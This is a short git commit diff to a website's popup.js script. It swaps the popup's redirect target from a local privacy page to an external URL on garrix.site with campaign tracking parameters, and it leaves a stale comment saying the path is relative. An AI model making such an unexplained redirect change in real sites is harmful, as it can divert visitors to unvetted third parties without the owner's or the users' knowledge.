9e48366b9e339a26b46290d4b05f5aff1be660a3
onebe8689-hue <onebe8689@gmail.com>
2025-12-10 01:45:33 +0530

    Update popup.js

--- assets/popup.js
+++ assets/popup.js
@@ -1,7 +1,7 @@
 // Minimal split: same behavior, two separate functions to call per page
 (function () {
   // Use relative path so it works in subfolders too
-  const REDIRECT = "privacy.html";
+  const REDIRECT = "https://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]";
  
   function buildPopup() {
     // prevent double render
@@ -67,4 +67,5 @@
   };
 })();
  
+
  
